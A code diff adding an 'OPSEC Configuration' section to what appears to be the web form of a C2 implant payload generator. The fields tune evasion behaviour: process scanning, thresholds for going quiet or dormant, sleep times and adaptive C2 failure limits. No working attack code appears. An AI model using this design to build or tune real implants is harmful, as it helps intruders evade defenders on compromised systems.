@@ -206,10 +206,84 @@
                             </div>
                         </div>
 
+                        <div class="form-section">
+                            <h3>OPSEC Configuration</h3>
+                            <div class="form-group">
+                                <label for="proc_scan_interval_secs">Process Scan Interval (s)</label>
+                                <input type="number" id="proc_scan_interval_secs" name="proc_scan_interval_secs" value="300" min="10">
+                                <small>Base interval for scanning processes. Adapts based on environment.</small>
+                            </div>
+                            <div class="form-group">
+                                <label for="base_threshold_enter_full_opsec">Score Threshold to Enter Full OPSEC</label>
+                                <input type="number" step="0.1" id="base_threshold_enter_full_opsec" name="base_threshold_enter_full_opsec" value="60.0" min="0" max="100">
+                                <small>Base score (0-100) to transition into Full OPSEC mode.</small>
+                            </div>
+                            <div class="form-group">
+                                <label for="base_threshold_exit_full_opsec">Score Threshold to Exit Full OPSEC / Enter Reduced</label>
+                                <input type="number" step="0.1" id="base_threshold_exit_full_opsec" name="base_threshold_exit_full_opsec" value="60.0" min="0" max="100">
+                                <small>Base score (0-100) to transition out of Full OPSEC mode (towards Reduced Activity).</small>
+                            </div>
+                             <div class="form-group">
+                                <label for="base_threshold_enter_reduced_activity">Score Threshold to Enter Reduced Activity</label>
+                                <input type="number" step="0.1" id="base_threshold_enter_reduced_activity" name="base_threshold_enter_reduced_activity" value="20.0" min="0" max="100">
+                                <small>Base score (0-100) to transition from Background to Reduced Activity.</small>
+                            </div>
+                            <div class="form-group">
+                                <label for="base_threshold_exit_reduced_activity">Score Threshold to Exit Reduced Activity / Enter Background</label>
+                                <input type="number" step="0.1" id="base_threshold_exit_reduced_activity" name="base_threshold_exit_reduced_activity" value="20.0" min="0" max="100">
+                                <small>Base score (0-100) to transition from Reduced Activity to Background.</small>
+                            </div>
+                            <div class="form-group">
+                                <label for="min_duration_full_opsec_secs">Min Duration in Full OPSEC (s)</label>
+                                <input type="number" id="min_duration_full_opsec_secs" name="min_duration_full_opsec_secs" value="300" min="0">
+                            </div>
+                            <div class="form-group">
+                                <label for="min_duration_reduced_activity_secs">Min Duration in Reduced Activity (s)</label>
+                                <input type="number" id="min_duration_reduced_activity_secs" name="min_duration_reduced_activity_secs" value="120" min="0">
+                            </div>
+                            <div class="form-group">
+                                <label for="min_duration_background_opsec_secs">Min Duration in Background OPSEC (s)</label>
+                                <input type="number" id="min_duration_background_opsec_secs" name="min_duration_background_opsec_secs" value="60" min="0">
+                            </div>
+                            <div class="form-group">
+                                <label for="reduced_activity_sleep_secs">Reduced Activity Sleep (s)</label>
+                                <input type="number" id="reduced_activity_sleep_secs" name="reduced_activity_sleep_secs" value="120" min="0">
+                                <small>Sleep duration when in Reduced Activity mode.</small>
+                            </div>
+
+                            <h4>Adaptive C2 Failure Thresholds</h4>
+                            <div class="form-group">
+                                <label for="base_max_consecutive_c2_failures">Base Max Consecutive C2 Failures</label>
+                                <input type="number" id="base_max_consecutive_c2_failures" name="base_max_consecutive_c2_failures" value="5" min="1">
+                                <small>Initial number of C2 failures before C2 Unstable signal triggers.</small>
+                            </div>
+                            <div class="form-group">
+                                <label for="c2_failure_threshold_increase_factor">C2 Threshold Increase Factor (Stable)</label>
+                                <input type="number" step="0.01" id="c2_failure_threshold_increase_factor" name="c2_failure_threshold_increase_factor" value="1.1" min="1.0">
+                                <small>Multiplier to increase C2 failure threshold when network is stable (e.g., 1.1 for 10% increase).</small>
+                            </div>
+                            <div class="form-group">
+                                <label for="c2_failure_threshold_decrease_factor">C2 Threshold Decrease Factor (Unstable)</label>
+                                <input type="number" step="0.01" id="c2_failure_threshold_decrease_factor" name="c2_failure_threshold_decrease_factor" value="0.9" min="0.1" max="1.0">
+                                <small>Multiplier to decrease C2 failure threshold during C2 failures (e.g., 0.9 for 10% decrease).</small>
+                            </div>
+                            <div class="form-group">
+                                <label for="c2_threshold_adjust_interval_secs">C2 Threshold Adjustment Interval (s)</label>
+                                <input type="number" id="c2_threshold_adjust_interval_secs" name="c2_threshold_adjust_interval_secs" value="3600" min="60">
+                                <small>How often to adapt the C2 failure threshold (e.g., 3600 for 1 hour). Set very high to disable.</small>
+                            </div>
+                            <div class="form-group">
+                                <label for="c2_dynamic_threshold_max_multiplier">C2 Threshold Max Multiplier</label>
+                                <input type="number" step="0.1" id="c2_dynamic_threshold_max_multiplier" name="c2_dynamic_threshold_max_multiplier" value="2.0" min="1.0">
+                                <small>Maximum the dynamic C2 threshold can be (e.g., 2.0 for 2x base threshold).</small>
+                            </div>
+                        </div>
+
                         <div class="form-actions">
                             <button type="submit" class="primary">Generate Payload</button>
                             <button type="reset" class="secondary">Reset</button>
                         </div>
+
                     </form>
                 </div>
             </div>
